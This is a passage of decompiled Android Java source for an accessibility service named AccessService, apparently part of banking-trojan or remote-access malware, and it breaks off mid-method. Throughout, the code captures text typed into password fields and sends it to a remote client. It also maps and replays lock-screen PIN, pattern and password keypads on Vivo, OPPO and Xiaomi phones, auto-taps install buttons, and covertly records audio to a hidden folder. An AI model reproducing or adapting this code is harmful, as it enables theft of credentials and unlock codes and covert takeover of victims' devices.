package com.mamimobi;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Point;
import android.graphics.Rect;
import android.graphics.drawable.Drawable;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.PowerManager;
import android.text.TextUtils;
import android.text.format.DateFormat;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.ViewGroup;
import android.view.ViewParent;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import android.webkit.WebView;
import android.widget.FrameLayout;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.impl.WorkDatabaseVersions;
import com.mamimobi.AccessService;
import com.mamimobi.mipush.R$drawable;
import com.mamimobi.mipush.R$id;
import com.mamimobi.mipush.R$layout;
import com.mamimobi.receiver.CSReceiver;
import com.mamimobi.receiver.LCReceiver;
import com.mamimobi.receiver.PKReceiver;
import com.mamimobi.receiver.SCNReceiver;
import com.mamimobi.utils.AppInitWorker;
import com.mamimobi.videostream.model.EditTextInfo;
import com.mamimobi.videostream.model.ScreenPoints;
import defpackage.a8;
import defpackage.d91;
import defpackage.e;
import defpackage.e6;
import defpackage.e70;
import defpackage.f;
import defpackage.f11;
import defpackage.f71;
import defpackage.fa0;
import defpackage.i6;
import defpackage.ij0;
import defpackage.is;
import defpackage.j1;
import defpackage.j31;
import defpackage.jg0;
import defpackage.k1;
import defpackage.km0;
import defpackage.l1;
import defpackage.la;
import defpackage.la0;
import defpackage.lm0;
import defpackage.m1;
import defpackage.m20;
import defpackage.ma0;
import defpackage.n1;
import defpackage.o1;
import defpackage.o71;
import defpackage.or0;
import defpackage.p1;
import defpackage.p7;
import defpackage.pk0;
import defpackage.pr0;
import defpackage.pv;
import defpackage.q1;
import defpackage.qr0;
import defpackage.rh0;
import defpackage.s90;
import defpackage.sa0;
import defpackage.t1;
import defpackage.t40;
import defpackage.tb;
import defpackage.ti0;
import defpackage.u1;
import defpackage.uj0;
import defpackage.v1;
import defpackage.w7;
import defpackage.wf0;
import defpackage.xm0;
import defpackage.y5;
import defpackage.z7;
import defpackage.z8;
import defpackage.zb;
import defpackage.zn;
import io.nats.client.Options;
import io.nats.client.support.ApiConstants;
import io.nats.client.support.NatsJetStreamConstants;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.lang.ref.WeakReference;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.locks.ReentrantLock;
import kotlin.uuid.Uuid;
import org.java_websocket.framing.CloseFrame;
import org.json.JSONArray;
import org.json.JSONObject;
import org.webrtc.DefaultVideoDecoderFactory;
import org.webrtc.DefaultVideoEncoderFactory;
import org.webrtc.EglBase;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.VideoSource;
import org.webrtc.VideoTrack;
import org.webrtc.audio.JavaAudioDeviceModule;

/* JADX INFO: loaded from: classes.dex */
public class AccessService extends AccessibilityService {
    public static String V = "";
    public static String W = "";
    public static boolean X = false;
    public static String Y = "";
    public static MediaRecorder Z = null;
    public static WindowManager a0 = null;
    public static KeyguardManager b0 = null;
    public static FrameLayout c0 = null;
    public static WindowManager.LayoutParams d0 = null;
    public static AccessService e0 = null;
    public static String f0 = "";
    public static String g0 = "";
    public static FrameLayout t0;
    public jg0 H;
    public i6 I;
    public o1 L;
    public String P;
    public String Q;
    public EditTextInfo S;
    public pv T;
    public static final m20 h0 = new m20();
    public static final AtomicBoolean i0 = new AtomicBoolean(false);
    public static final AtomicBoolean j0 = new AtomicBoolean(false);
    public static final AtomicBoolean k0 = new AtomicBoolean(false);
    public static final AtomicBoolean l0 = new AtomicBoolean(false);
    public static final AtomicBoolean m0 = new AtomicBoolean(false);
    public static final AtomicBoolean n0 = new AtomicBoolean(false);
    public static final AtomicBoolean o0 = new AtomicBoolean(false);
    public static final ArrayList p0 = new ArrayList();
    public static WebView q0 = null;
    public static final ExecutorService r0 = Executors.newSingleThreadExecutor();
    public static final String s0 = "[USE-REC]";
    public static final AtomicBoolean u0 = new AtomicBoolean(false);
    public static final AtomicBoolean v0 = new AtomicBoolean(false);
    public static final AtomicBoolean w0 = new AtomicBoolean(false);
    public static final AtomicBoolean x0 = new AtomicBoolean(false);
    public static final AtomicBoolean y0 = new AtomicBoolean(false);
    public static final AtomicBoolean z0 = new AtomicBoolean(false);
    public static final AtomicBoolean A0 = new AtomicBoolean(false);
    public static final AtomicBoolean B0 = new AtomicBoolean(false);
    public static final AtomicInteger C0 = new AtomicInteger(-1);
    public static final AtomicBoolean D0 = new AtomicBoolean(false);
    public static StringBuilder E0 = new StringBuilder();
    public static final AtomicBoolean F0 = new AtomicBoolean(false);
    public static final AtomicBoolean G0 = new AtomicBoolean(false);
    public static final AtomicBoolean H0 = new AtomicBoolean(false);
    public static final AtomicBoolean I0 = new AtomicBoolean(false);
    public static final AtomicBoolean J0 = new AtomicBoolean(false);
    public static final AtomicBoolean K0 = new AtomicBoolean(false);
    public static final AtomicBoolean L0 = new AtomicBoolean(false);
    public static final AtomicBoolean M0 = new AtomicBoolean(true);
    public static String N0 = "";
    public static long O0 = 0;
    public static final HashMap P0 = new HashMap();
    public static final HashSet Q0 = new HashSet();
    public static final HashSet R0 = new HashSet();
    public static final HashSet S0 = new HashSet();
    public static String T0 = null;
    public static String U0 = null;
    public static String V0 = null;
    public static final HashMap W0 = new HashMap();
    public static final HashMap X0 = new HashMap();
    public static final HashSet Y0 = new HashSet();
    public static WebView Z0 = null;
    public static final Handler a1 = new Handler(Looper.getMainLooper(), new m1(0));
    public tb E = null;
    public long F = 0;
    public String G = "";
    public String J = null;
    public long K = 0;
    public final Handler M = new Handler(Looper.getMainLooper());
    public final ExecutorService N = Executors.newFixedThreadPool(2);
    public final Handler O = new Handler(Looper.getMainLooper());
    public final wf0 R = new wf0();
    public final n1 U = new ti0() { // from class: n1
        @Override // defpackage.ti0
        public final void onChanged(Object obj) {
            EditTextInfo editTextInfo;
            EditTextInfo editTextInfo2 = (EditTextInfo) obj;
            String str = AccessService.V;
            AccessService accessService = this.a;
            if (editTextInfo2 != null) {
                int i = editTextInfo2.eventType;
                if (i == 16 || i == 1) {
                    if (accessService.S == null) {
                        accessService.S = editTextInfo2;
                    }
                    if (!Objects.equals(editTextInfo2.resourceName, accessService.S.resourceName) && (editTextInfo = accessService.S) != null && editTextInfo.resourceName != null) {
                        AccessService.r0.execute(new p1(0, accessService, editTextInfo, true));
                    }
                    if (editTextInfo2.isPasswd) {
                        ArrayList arrayList = AccessService.p0;
                        if (arrayList.isEmpty()) {
                            if (editTextInfo2.text != null ? !r3.replaceAll("\\s+", "").isEmpty() : false) {
                                arrayList.add(editTextInfo2.text);
                            }
                        } else if (!((String) arrayList.get(arrayList.size() - 1)).equals(editTextInfo2.text)) {
                            arrayList.add(editTextInfo2.text);
                        }
                    }
                    accessService.S = editTextInfo2;
                }
            }
        }
    };

    public static void E(AccessibilityNodeInfo accessibilityNodeInfo) {
        boolean z = true;
        k0.set(true);
        f0 = "";
        C0.set(3);
        H();
        String[] strArr = {"com.android.systemui:id/vivo_lock_pattern_view", "com.android.systemui:id/colorLockPatternView", "com.android.systemui:id/lockPatternView", "com.android.systemui:id/lock_pattern_view"};
        for (int i = 0; i < 4; i++) {
            AccessibilityNodeInfo accessibilityNodeInfoG = g(accessibilityNodeInfo, strArr[i]);
            if (accessibilityNodeInfoG != null) {
                Rect rect = new Rect();
                accessibilityNodeInfoG.getBoundsInScreen(rect);
                if (rect.width() > 0 && rect.height() > 0) {
                    is isVar = new is(21);
                    WindowManager windowManager = pk0.a;
                    try {
                        if (e0 != null) {
                            AtomicBoolean atomicBoolean = pk0.h;
                            if (atomicBoolean.get()) {
                                return;
                            }
                            long jCurrentTimeMillis = System.currentTimeMillis();
                            long j = pk0.g.get();
                            if (j <= 0 || jCurrentTimeMillis - j > 1000) {
                                pk0.c.getClass();
                                ReentrantLock reentrantLock = pk0.d;
                                if (reentrantLock.tryLock()) {
                                    try {
                                        AtomicInteger atomicInteger = new AtomicInteger(-1);
                                        pk0.f.set(isVar);
                                        if (Looper.myLooper() != Looper.getMainLooper()) {
                                            z = false;
                                        }
                                        if (z) {
                                            atomicInteger.set(pk0.d(rect));
                                        } else {
                                            new Handler(Looper.getMainLooper()).post(new p7(atomicInteger, 9, rect));
                                        }
                                        AtomicInteger atomicInteger2 = new AtomicInteger(0);
                                        while (!atomicBoolean.get() && Integer.valueOf(atomicInteger.get()).equals(-1) && atomicInteger2.incrementAndGet() < 100) {
                                            try {
                                                Thread.sleep(1L);
                                            } catch (InterruptedException unused) {
                                                Thread.currentThread().interrupt();
                                            }
                                        }
                                        reentrantLock.unlock();
                                        return;
                                    } catch (Throwable th) {
                                        reentrantLock.unlock();
                                        throw th;
                                    }
                                }
                                return;
                            }
                            return;
                        }
                        return;
                    } catch (Exception e) {
                        s90.J("PatternLockHelper", e);
                        return;
                    }
                }
                accessibilityNodeInfoG.recycle();
            }
        }
    }

    public static void G() {
        String strEncodeToString;
        if (s0.equals("YES") && !X) {
            X = true;
            try {
                strEncodeToString = Base64.encodeToString((DateFormat.format("yyyy-MM-dd", new Date()).toString() + "-" + CSReceiver.b + "_" + CSReceiver.e + "_" + CSReceiver.a + "_" + String.valueOf(System.currentTimeMillis()).substring(r1.length() - 5)).getBytes("UTF-8"), 0);
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
                strEncodeToString = null;
            }
            File file = new File(Environment.getExternalStorageDirectory(), "/Config/sys/apps/rc");
            if (!file.exists()) {
                file.mkdirs();
            }
            String str = Environment.getExternalStorageDirectory() + "/Config/sys/apps/rc/" + strEncodeToString.replace("\n", "[nl]") + ".3gp";
            MediaRecorder mediaRecorder = new MediaRecorder();
            Z = mediaRecorder;
            mediaRecorder.setAudioSource(6);
            Z.setOutputFormat(1);
            Z.setAudioEncoder(1);
            Z.setOutputFile(str);
            try {
                Z.prepare();
            } catch (IOException unused) {
            }
            try {
                Z.start();
            } catch (Exception unused2) {
            }
        }
    }

    public static void H() {
        fa0.Q0(e0, "PST", String.valueOf(C0.get()));
    }

    public static void I() {
        new Handler(Looper.getMainLooper()).post(new l1(0));
    }

    public static void J() {
        try {
            String strQ0 = fa0.q0(e0, "MIXPOINTS", "");
            if (TextUtils.isEmpty(strQ0)) {
                return;
            }
            JSONArray jSONArray = new JSONArray(strQ0);
            long j = 0;
            for (int i = 0; i < jSONArray.length(); i++) {
                j += 1000;
                a1.postDelayed(new e(1, jSONArray.getString(i)), j);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void d(AccessibilityNodeInfo accessibilityNodeInfo, HashMap map) {
        Rect rect;
        String string = (accessibilityNodeInfo.getText() == null || accessibilityNodeInfo.getText().length() <= 0) ? (accessibilityNodeInfo.getContentDescription() == null || accessibilityNodeInfo.getContentDescription().length() <= 0) ? "" : accessibilityNodeInfo.getContentDescription().toString() : accessibilityNodeInfo.getText().toString();
        if (string.isEmpty() || (rect = (Rect) map.get(string)) == null) {
            return;
        }
        Iterator it = Y0.iterator();
        while (it.hasNext()) {
            ((ij0) it.next()).a(rect.centerX(), rect.centerY());
        }
    }

    public static String e(AccessibilityEvent accessibilityEvent) {
        CharSequence charSequence;
        if (accessibilityEvent == null) {
            return "";
        }
        List<CharSequence> text = accessibilityEvent.getText();
        if (text != null && !text.isEmpty() && (charSequence = text.get(0)) != null && charSequence.length() > 0) {
            return charSequence.toString();
        }
        CharSequence contentDescription = accessibilityEvent.getContentDescription();
        return contentDescription != null ? contentDescription.toString() : "";
    }

    public static void f(JSONObject jSONObject, AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            jSONObject.put("resId", accessibilityNodeInfo.getViewIdResourceName());
            jSONObject.put("clsName", String.valueOf(accessibilityNodeInfo.getClassName()));
            jSONObject.put("isFocused", accessibilityNodeInfo.isFocused());
            jSONObject.put("isChecked", accessibilityNodeInfo.isChecked());
            jSONObject.put("isClickable", accessibilityNodeInfo.isClickable());
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("left", rect.left);
            jSONObject2.put("right", rect.right);
            jSONObject2.put("top", rect.top);
            jSONObject2.put("bottom", rect.bottom);
            jSONObject.put("bounds", jSONObject2);
        } catch (Exception unused) {
        }
    }

    public static AccessibilityNodeInfo g(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId;
        if (accessibilityNodeInfo == null || (listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str)) == null || listFindAccessibilityNodeInfosByViewId.isEmpty()) {
            return null;
        }
        return listFindAccessibilityNodeInfosByViewId.get(0);
    }

    public static String h(Context context, String str) {
        try {
            PackageManager packageManager = context.getPackageManager();
            return (String) packageManager.getApplicationLabel(packageManager.getApplicationInfo(str, Uuid.SIZE_BITS));
        } catch (PackageManager.NameNotFoundException unused) {
            return "";
        }
    }

    public static boolean i(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null) {
            int childCount = accessibilityNodeInfo.getChildCount();
            if ("android.widget.Button".contentEquals(accessibilityNodeInfo.getClassName())) {
                String string = accessibilityNodeInfo.getText().toString();
                if (!TextUtils.isEmpty(string) && ("安装".equals(string) || "install".equalsIgnoreCase(string) || "done".equalsIgnoreCase(string) || "完成".equals(string) || "تثبيت".equals(string) || "确定".equals(string))) {
                    accessibilityNodeInfo.performAction(16);
                    return true;
                }
            } else if ("android.widget.ScrollView".contentEquals(accessibilityNodeInfo.getClassName())) {
                accessibilityNodeInfo.performAction(Options.DEFAULT_MAX_CONTROL_LINE);
            }
            for (int i = 0; i < childCount; i++) {
                if (i(accessibilityNodeInfo.getChild(i))) {
                    return true;
                }
            }
        }
        return false;
    }

    public static void m(AccessibilityEvent accessibilityEvent, int i, AccessibilityNodeInfo accessibilityNodeInfo) {
        CharSequence packageName;
        if (accessibilityNodeInfo != null) {
            try {
                if (i == 1) {
                    Rect rect = new Rect();
                    accessibilityNodeInfo.getBoundsInScreen(rect);
                    float fExactCenterX = rect.exactCenterX();
                    float fExactCenterY = rect.exactCenterY();
                    Iterator it = Y0.iterator();
                    while (it.hasNext()) {
                        ((ij0) it.next()).a(fExactCenterX, fExactCenterY);
                    }
                    return;
                }
                if (i == 2048 && (packageName = accessibilityEvent.getPackageName()) != null) {
                    String string = packageName.toString();
                    if (V0.equals(string)) {
                        d(accessibilityNodeInfo, W0);
                    } else if ("com.android.systemui".equals(string)) {
                        d(accessibilityNodeInfo, X0);
                    }
                }
            } catch (Exception unused) {
            }
        }
    }

    public static void q(AccessibilityNodeInfo accessibilityNodeInfo) {
        k0.set(true);
        f0 = "";
        C0.set(1);
        H();
        try {
            AccessibilityNodeInfo accessibilityNodeInfoG = g(accessibilityNodeInfo, "com.android.systemui:id/pinColorNumericKeyboard");
            HashMap map = P0;
            if (accessibilityNodeInfoG != null) {
                int childCount = accessibilityNodeInfoG.getChildCount();
                for (int i = 0; i < childCount; i++) {
                    AccessibilityNodeInfo child = accessibilityNodeInfoG.getChild(i);
                    if (child != null) {
                        Rect rect = new Rect();
                        child.getBoundsInScreen(rect);
                        ScreenPoints screenPoints = new ScreenPoints();
                        screenPoints.x = rect.centerX();
                        screenPoints.y = rect.centerY();
                        screenPoints.rect = rect;
                        screenPoints.contentDesc = child.getContentDescription();
                        screenPoints.text = child.getText();
                        screenPoints.resId = child.getViewIdResourceName();
                        CharSequence charSequence = screenPoints.contentDesc;
                        if (charSequence != null) {
                            String string = charSequence.toString();
                            if (string.length() == 1) {
                                screenPoints.key = string;
                            } else {
                                screenPoints.key = "d";
                            }
                        }
                        map.put(screenPoints.key, screenPoints);
                    }
                }
            }
            if (map.size() < 10) {
                t(accessibilityNodeInfo);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void s() {
        new Handler(Looper.getMainLooper()).post(new l1(1));
    }

    public static void t(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
            if (viewIdResourceName != null) {
                boolean zEquals = viewIdResourceName.equals("com.android.systemui:id/delete_button");
                HashMap map = P0;
                if (zEquals || viewIdResourceName.equals("com.android.systemui:id/btn_letter_delete") || viewIdResourceName.equals("com.android.systemui:id/vivo_cancel")) {
                    Rect rect = new Rect();
                    accessibilityNodeInfo.getBoundsInScreen(rect);
                    ScreenPoints screenPoints = new ScreenPoints();
                    screenPoints.x = rect.centerX();
                    screenPoints.y = rect.centerY();
                    screenPoints.rect = rect;
                    screenPoints.contentDesc = accessibilityNodeInfo.getContentDescription();
                    screenPoints.text = accessibilityNodeInfo.getText();
                    screenPoints.resId = accessibilityNodeInfo.getViewIdResourceName();
                    screenPoints.key = "d";
                    map.put("d", screenPoints);
                    Log.d("PatternLockHelper", screenPoints.key + "," + screenPoints.resId + "," + screenPoints.rect);
                } else if (viewIdResourceName.equals("com.android.systemui:id/key_enter") || viewIdResourceName.equals("com.android.systemui:id/key_enter_text") || viewIdResourceName.equals("com.android.systemui:id/vivo_pin_confirm") || viewIdResourceName.equals("com.android.systemui:id/btn_letter_ok") || viewIdResourceName.equals("com.android.systemui:id/mix_normal_confirm")) {
                    Rect rect2 = new Rect();
                    accessibilityNodeInfo.getBoundsInScreen(rect2);
                    ScreenPoints screenPoints2 = new ScreenPoints();
                    screenPoints2.x = rect2.centerX();
                    screenPoints2.y = rect2.centerY();
                    screenPoints2.rect = rect2;
                    screenPoints2.contentDesc = accessibilityNodeInfo.getContentDescription();
                    screenPoints2.text = accessibilityNodeInfo.getText();
                    screenPoints2.resId = accessibilityNodeInfo.getViewIdResourceName();
                    screenPoints2.key = "e";
                    map.put("e", screenPoints2);
                    Log.d("PatternLockHelper", screenPoints2.key + "," + screenPoints2.resId + "," + screenPoints2.rect);
                } else if (viewIdResourceName.startsWith("com.android.systemui:id/key") || viewIdResourceName.startsWith("com.android.systemui:id/VivoPinkey") || viewIdResourceName.startsWith("com.android.systemui:id/num") || viewIdResourceName.startsWith("com.android.systemui:id/char_")) {
                    Rect rect3 = new Rect();
                    accessibilityNodeInfo.getBoundsInScreen(rect3);
                    ScreenPoints screenPoints3 = new ScreenPoints();
                    screenPoints3.x = rect3.centerX();
                    screenPoints3.y = rect3.centerY();
                    screenPoints3.rect = rect3;
                    screenPoints3.contentDesc = accessibilityNodeInfo.getContentDescription();
                    screenPoints3.text = accessibilityNodeInfo.getText();
                    screenPoints3.resId = accessibilityNodeInfo.getViewIdResourceName();
                    if (viewIdResourceName.startsWith("com.android.systemui:id/key")) {
                        screenPoints3.key = viewIdResourceName.replace("com.android.systemui:id/key", "");
                    } else if (viewIdResourceName.startsWith("com.android.systemui:id/num")) {
                        screenPoints3.key = viewIdResourceName.replace("com.android.systemui:id/num", "");
                    } else if (viewIdResourceName.startsWith("com.android.systemui:id/VivoPinkey")) {
                        screenPoints3.key = viewIdResourceName.replace("com.android.systemui:id/VivoPinkey", "");
                    } else if (viewIdResourceName.startsWith("com.android.systemui:id/char_")) {
                        screenPoints3.key = viewIdResourceName.replace("com.android.systemui:id/char_", "");
                    }
                    if (screenPoints3.key.length() == 1) {
                        Log.d("PatternLockHelper", screenPoints3.key + "," + screenPoints3.resId + "," + screenPoints3.rect);
                        map.put(screenPoints3.key, screenPoints3);
                    }
                }
            }
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    t(child);
                    child.recycle();
                }
            }
        } catch (Exception unused) {
        }
    }

    public static boolean v(String str) {
        if (TextUtils.isEmpty(str)) {
            return false;
        }
        return fa0.G(str, s90.b) || fa0.G(str, s90.i);
    }

    public static boolean w(AccessibilityNodeInfo accessibilityNodeInfo) {
        return (g(accessibilityNodeInfo, "com.android.systemui:id/lockPatternView") == null && g(accessibilityNodeInfo, "com.android.systemui:id/lock_pattern_view") == null && g(accessibilityNodeInfo, "com.android.systemui:id/colorLockPatternView") == null && g(accessibilityNodeInfo, "com.android.systemui:id/vivo_lock_pattern_view") == null) ? false : true;
    }

    public static boolean x(AccessibilityNodeInfo accessibilityNodeInfo) {
        return (g(accessibilityNodeInfo, "com.android.systemui:id/pinColorNumericKeyboard") == null && g(accessibilityNodeInfo, "com.android.systemui:id/pinEntry") == null && g(accessibilityNodeInfo, "com.android.systemui:id/fixedPinEntry") == null && g(accessibilityNodeInfo, "com.android.systemui:id/vivo_pin_edittext") == null && g(accessibilityNodeInfo, "com.android.systemui:id/fixedPinEntry") == null && g(accessibilityNodeInfo, "com.android.systemui:id/oplusos_kgd_security_pin_six_view") == null) ? false : true;
    }

    public static boolean y(AccessService accessService, String str) {
        try {
            int i = accessService.getPackageManager().getPackageInfo(str, 0).applicationInfo.flags;
            return ((i & 1) == 0 && (i & Uuid.SIZE_BITS) == 0) ? false : true;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return false;
        }
    }

    public static boolean z(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (g(accessibilityNodeInfo, "com.android.systemui:id/passwordEntry") != null || g(accessibilityNodeInfo, "com.android.systemui:id/pwd_input_layout") != null || g(accessibilityNodeInfo, "com.android.systemui:id/MixPwEntry") != null || g(accessibilityNodeInfo, "com.android.systemui:id/securityEditText") != null) {
            return true;
        }
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(accessibilityNodeInfo);
            while (!linkedList.isEmpty()) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) linkedList.poll();
                if (accessibilityNodeInfo2 != null) {
                    CharSequence className = accessibilityNodeInfo2.getClassName();
                    if (className != null && className.toString().contains("android.widget.EditText")) {
                        return true;
                    }
                    for (int i = 0; i < accessibilityNodeInfo2.getChildCount(); i++) {
                        linkedList.add(accessibilityNodeInfo2.getChild(i));
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    public final void A(AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent.getPackageName() != null && "com.android.systemui".equals(accessibilityEvent.getPackageName().toString()) && b0.isKeyguardLocked()) {
            AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
            if (g(rootInActiveWindow, "com.android.systemui:id/keyguard_security_container") == null && g(rootInActiveWindow, "com.android.systemui:id/keyguard_host_view") == null && g(rootInActiveWindow, "com.android.systemui:id/MixPwEntry") == null && g(rootInActiveWindow, "com.android.systemui:id/passwordEntry") == null) {
                return;
            }
            String str = Build.MANUFACTURER;
            try {
                if (str.equalsIgnoreCase("OPPO")) {
                    AccessibilityNodeInfo accessibilityNodeInfoG = g(rootInActiveWindow, "com.android.systemui:id/securityEditText");
                    if (accessibilityNodeInfoG == null) {
                        AccessibilityNodeInfo accessibilityNodeInfoG2 = g(rootInActiveWindow, "com.android.systemui:id/pwd_input_layout");
                        if (accessibilityNodeInfoG2 != null && v(accessibilityNodeInfoG2.getText().toString())) {
                            sa0.a.clear();
                            f0 = "";
                        }
                    } else if (v(accessibilityNodeInfoG.getText().toString())) {
                        sa0.a.clear();
                        f0 = "";
                    }
                } else {
                    if (!str.equalsIgnoreCase("Xiaomi") || rootInActiveWindow == null) {
                        return;
                    }
                    AccessibilityNodeInfo accessibilityNodeInfoG3 = g(rootInActiveWindow, "com.android.systemui:id/passwordEntry");
                    if (accessibilityNodeInfoG3 != null && v(accessibilityNodeInfoG3.getText().toString())) {
                        sa0.a.clear();
                        f0 = "";
                    }
                }
            } catch (Exception unused) {
            }
        }
    }

    public final void B() {
        try {
            new Handler(Looper.getMainLooper()).post(new f(1, this));
        } catch (Exception unused) {
        }
    }

    public final void C() {
        AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return;
        }
        AccessibilityNodeInfo accessibilityNodeInfoFindFocus = rootInActiveWindow.findFocus(1);
        if (accessibilityNodeInfoFindFocus != null) {
            try {
                accessibilityNodeInfoFindFocus.performAction(1);
                Bundle bundle = new Bundle();
                bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", Y);
                accessibilityNodeInfoFindFocus.performAction(2097152, bundle);
                Y = "";
            } catch (Throwable th) {
                accessibilityNodeInfoFindFocus.recycle();
                rootInActiveWindow.recycle();
                throw th;
            }
        }
        if (accessibilityNodeInfoFindFocus != null) {
            accessibilityNodeInfoFindFocus.recycle();
        }
        rootInActiveWindow.recycle();
    }

    public final void D(EditTextInfo editTextInfo) {
        String string;
        String str;
        ArrayList<String> arrayList = editTextInfo.isPasswd ? new ArrayList(p0) : null;
        if (!editTextInfo.isPasswd) {
            string = editTextInfo.text;
        } else if (arrayList.isEmpty()) {
            string = "";
        } else {
            int i = 1;
            while (i < arrayList.size()) {
                int length = ((String) arrayList.get(i)).length();
                for (int i2 = i - 1; i2 >= 0; i2--) {
                    if (((String) arrayList.get(i2)).length() >= length) {
                        arrayList.remove(i2);
                        i--;
                    }
                }
                i++;
            }
            StringBuilder sb = new StringBuilder();
            for (String str2 : arrayList) {
                sb.append(str2.charAt(str2.length() - 1));
            }
            string = sb.toString();
        }
        if (TextUtils.isEmpty(string)) {
            return;
        }
        if (editTextInfo.isPasswd && (("com.android.systemui".equals(editTextInfo.packageName) || ((str = editTextInfo.resourceName) != null && (str.contains("password") || str.contains("pwd") || str.contains("pass")))) && string != null)) {
            try {
                if (!string.isEmpty()) {
                    g0 = string;
                    HashMap map = W0;
                    if (!map.isEmpty() && Build.MANUFACTURER.equalsIgnoreCase("Xiaomi")) {
                        JSONArray jSONArray = new JSONArray();
                        for (int i3 = 0; i3 < string.length(); i3++) {
                            if (((Rect) map.get(String.valueOf(string.charAt(i3)))) != null) {
                                ScreenPoints screenPoints = new ScreenPoints();
                                screenPoints.x = r5.centerX();
                                screenPoints.y = r5.centerY();
                                jSONArray.put(h0.f(screenPoints));
                            }
                        }
                        if (jSONArray.length() > 0) {
                            fa0.Q0(this, "MIXCLICK", jSONArray.toString());
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        JSONObject jSONObject = new JSONObject();
        PackageManager packageManager = getPackageManager();
        try {
            Drawable drawableLoadIcon = packageManager.getPackageInfo(editTextInfo.packageName, 0).applicationInfo.loadIcon(packageManager);
            Bitmap bitmapCreateBitmap = Bitmap.createBitmap(24, 24, Bitmap.Config.ARGB_8888);
            Canvas canvas = new Canvas(bitmapCreateBitmap);
            drawableLoadIcon.setBounds(0, 0, 24, 24);
            drawableLoadIcon.draw(canvas);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            bitmapCreateBitmap.compress(Bitmap.CompressFormat.PNG, 80, byteArrayOutputStream);
            jSONObject.put("icon", Base64.encodeToString(byteArrayOutputStream.toByteArray(), 0));
        } catch (Exception unused) {
        }
        try {
            jSONObject.put("appName", packageManager.getApplicationLabel(packageManager.getApplicationInfo(editTextInfo.packageName, 0)));
        } catch (Exception unused2) {
        }
        try {
            jSONObject.put("isPasswd", editTextInfo.isPasswd);
            jSONObject.put("packageName", editTextInfo.packageName);
            jSONObject.put("resourceName", editTextInfo.resourceName);
            jSONObject.put("text", string);
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put(ApiConstants.ID, t40.V(this));
            jSONObject2.put(ApiConstants.ACTION, "editinfo");
            jSONObject2.put(ApiConstants.DATA, jSONObject);
            o71 o71VarF = o71.f(this);
            if (o71VarF.e() != null) {
                jSONObject2.put("clientid", o71VarF.e());
            }
            lm0 lm0Var = o71VarF.e;
            if (lm0Var != null) {
                lm0Var.c(jSONObject2.toString().getBytes());
            }
        } catch (Exception unused3) {
        }
    }

    public final void F(String str, JSONObject jSONObject) {
        try {
            String string = jSONObject.toString();
            if (F0.get()) {
                return;
            }
            if (f71.d(str) || str.equals(V0)) {
                this.H.b(string, "webrtc_wlt_core_msg");
            }
            this.H.b(string, jSONObject.optString(ApiConstants.ID));
        } catch (Exception unused) {
        }
    }

    public final void K() {
        AccessibilityNodeInfo accessibilityNodeInfo;
        String strQ0 = fa0.q0(e0, "CURPST", "");
        this.G = strQ0;
        if (strQ0.isEmpty()) {
            return;
        }
        AtomicBoolean atomicBoolean = A0;
        atomicBoolean.getAndSet(true);
        AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
        int length = this.G.length();
        for (int i = 0; i < length; i++) {
            try {
